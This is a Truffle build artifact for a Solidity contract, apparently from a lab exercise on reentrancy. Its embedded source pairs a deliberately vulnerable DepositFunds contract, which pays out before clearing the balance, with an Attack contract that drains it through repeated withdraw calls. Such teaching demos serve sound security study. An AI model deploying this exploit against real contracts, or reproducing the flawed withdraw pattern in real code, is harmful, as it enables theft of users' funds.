{
  "contractName": "DepositFunds",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "name": "balances",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "deposit",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function",
      "payable": true
    },
    {
      "inputs": [],
      "name": "withdraw",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b5061046a806100206000396000f3fe6080604052600436106100345760003560e01c806327e235e3146100395780633ccfd60b14610076578063d0e30db01461008d575b600080fd5b34801561004557600080fd5b50610060600480360381019061005b91906102ad565b610097565b60405161006d91906102f3565b60405180910390f35b34801561008257600080fd5b5061008b6100af565b005b6100956101f3565b005b60006020528060005260406000206000915090505481565b60008060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020549050600081116100ff57600080fd5b60003373ffffffffffffffffffffffffffffffffffffffff16826040516101259061033f565b60006040518083038185875af1925050503d8060008114610162576040519150601f19603f3d011682016040523d82523d6000602084013e610167565b606091505b50509050806101ab576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016101a2906103b1565b60405180910390fd5b60008060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055505050565b346000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008282546102419190610400565b92505081905550565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b600061027a8261024f565b9050919050565b61028a8161026f565b811461029557600080fd5b50565b6000813590506102a781610281565b92915050565b6000602082840312156102c3576102c261024a565b5b60006102d184828501610298565b91505092915050565b6000819050919050565b6102ed816102da565b82525050565b600060208201905061030860008301846102e4565b92915050565b600081905092915050565b50565b600061032960008361030e565b915061033482610319565b600082019050919050565b600061034a8261031c565b9150819050919050565b600082825260208201905092915050565b7f4661696c656420746f2073656e64204574686572000000000000000000000000600082015250565b600061039b601483610354565b91506103a682610365565b602082019050919050565b600060208201905081810360008301526103ca8161038e565b9050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b600061040b826102da565b9150610416836102da565b925082820190508082111561042e5761042d6103d1565b5b9291505056fea2646970667358221220b98a2887a613682906751747224cd4448b2750bbb12688231caf37532a1dccca64736f6c63430008110033",
  "immutableReferences": {},
  "source": "// SPDX-License-Identifier: MIT\r\n\r\npragma solidity ^0.8.1;\r\n\r\ncontract DepositFunds {\r\n    mapping(address => uint) public balances;\r\n\r\n    function deposit() public payable {\r\n        balances[msg.sender] += msg.value;\r\n    }\r\n\r\n    function withdraw() public {\r\n        uint bal = balances[msg.sender];\r\n        require(bal > 0);\r\n\r\n        (bool sent, ) = msg.sender.call{value: bal}(\"\");\r\n        require(sent, \"Failed to send Ether\");\r\n\r\n        balances[msg.sender] = 0;\r\n    }\r\n}\r\n\r\ncontract Attack {\r\n    DepositFunds public depositFunds;\r\n\r\n    constructor(address _depositFundsAddress) {\r\n        depositFunds = DepositFunds(_depositFundsAddress);\r\n    }\r\n\r\n    // Fallback is called when DepositFunds sends Ether to this contract.\r\n    fallback() external payable {\r\n        if (address(depositFunds).balance >= 1 ether) {\r\n            depositFunds.withdraw();\r\n        }\r\n    }\r\n\r\n    function attack() external payable {\r\n        require(msg.value >= 1 ether);\r\n        depositFunds.deposit{value: 1 ether}();\r\n        depositFunds.withdraw();\r\n    }\r\n\r\n}",
  "sourcePath": "C:\\Lab\\Sol-Test\\truffle-debugg\\contracts\\Reentrancy.sol",
  "compiler": {
    "name": "solc",
    "version": "0.8.17+commit.8df45f5f.Emscripten.clang"
  },
  "schemaVersion": "3.4.10",
  "updatedAt": "2022-10-31T04:13:43.038Z",
  "networkType": "ethereum",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  }
}